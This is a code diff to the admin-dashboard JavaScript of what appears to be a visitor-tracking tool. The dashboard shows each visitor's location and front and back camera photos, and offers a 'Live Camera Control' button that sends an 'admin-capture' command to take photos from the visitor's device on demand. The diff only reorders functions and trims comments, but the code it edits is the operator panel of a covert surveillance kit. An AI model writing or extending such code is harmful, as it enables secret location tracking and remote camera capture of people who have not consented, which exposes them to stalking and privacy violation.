@@ -125,7 +125,7 @@ function displayVisitors(visitors) {
 }
 
 // ============================================
-// SHOW VISITOR DETAILS (COMPLETE WITH BUTTONS)
+// SHOW VISITOR DETAILS
 // ============================================
 function showVisitorDetails(visitorId) {
     currentVisitorId = visitorId;
@@ -153,7 +153,7 @@ function showVisitorDetails(visitorId) {
                         </div>
                     </div>
                     
-                    <!-- RIGHT COLUMN: Location + Photos + Controls -->
+                    <!-- RIGHT COLUMN -->
                     <div>
                         <h3>📍 Location</h3>
                         ${visitor.location ? `
@@ -165,9 +165,7 @@ function showVisitorDetails(visitorId) {
                             </div>
                         ` : '<p style="color:#999;">Location not available</p>'}
                         
-                        <!-- ========================================== -->
-                        <!-- PHOTOS WITH DOWNLOAD BUTTONS -->
-                        <!-- ========================================== -->
+                        <!-- PHOTOS WITH DOWNLOAD -->
                         <h3 style="margin-top:20px;">📸 Photos</h3>
                         <div style="display:flex; gap:20px; flex-wrap:wrap;">
                             ${visitor.frontCamera ? `
@@ -195,9 +193,7 @@ function showVisitorDetails(visitorId) {
                             ` : '<p style="color:#999;">No back photo</p>'}
                         </div>
                         
-                        <!-- ========================================== -->
                         <!-- LIVE CAPTURE CONTROLS -->
-                        <!-- ========================================== -->
                         <div style="margin-top:20px; border-top:1px solid #ddd; padding-top:15px;">
                             <h3>📸 Live Camera Control</h3>
                             <p style="font-size:13px; color:#666; margin-bottom:10px;">Click to capture photo from visitor's device</p>
@@ -222,24 +218,6 @@ function showVisitorDetails(visitorId) {
 }
 
 // ============================================
-// DELETE VISITOR
-// ============================================
-function deleteVisitor(visitorId) {
-    if (!confirm('Delete this visitor data?')) return;
-    
-    fetch(`/api/visitor/${visitorId}`, { method: 'DELETE' })
-        .then(response => response.json())
-        .then(data => {
-            if (data.success) {
-                showNotification('🗑️ Visitor deleted');
-                loadVisitors();
-                updateStats();
-                document.getElementById('visitorDetails').style.display = 'none';
-            }
-        });
-}
-
-// ============================================
 // CAPTURE VISITOR PHOTO (LIVE)
 // ============================================
 function captureVisitorPhoto(type) {
@@ -254,19 +232,16 @@ function captureVisitorPhoto(type) {
         statusDiv.style.color = '#4299e1';
     }
     
-    // Send command to server
     socket.emit('admin-capture', {
         visitorId: currentVisitorId,
         type: type
     });
     
-    // Show status update
     setTimeout(() => {
         if (statusDiv) {
-            statusDiv.textContent = `✅ ${type} photo requested! Check photos section.`;
+            statusDiv.textContent = `✅ ${type} photo requested! Refreshing...`;
             statusDiv.style.color = '#22a67e';
         }
-        // Refresh visitor details after 2 seconds
         setTimeout(() => {
             showVisitorDetails(currentVisitorId);
         }, 2000);
@@ -292,6 +267,24 @@ function downloadPhoto(imageData, filename) {
     } catch (e) {
         alert('Error downloading photo: ' + e.message);
     }
+}
+
+// ============================================
+// DELETE VISITOR
+// ============================================
+function deleteVisitor(visitorId) {
+    if (!confirm('Delete this visitor data?')) return;
+    
+    fetch(`/api/visitor/${visitorId}`, { method: 'DELETE' })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                showNotification('🗑️ Visitor deleted');
+                loadVisitors();
+                updateStats();
+                document.getElementById('visitorDetails').style.display = 'none';
+            }
+        });
 }
 
 // ============================================
@@ -349,7 +342,6 @@ function showNotification(message) {
 loadVisitors();
 updateStats();
 
-// Auto-refresh every 10 seconds
 setInterval(() => {
     loadVisitors();
     updateStats();
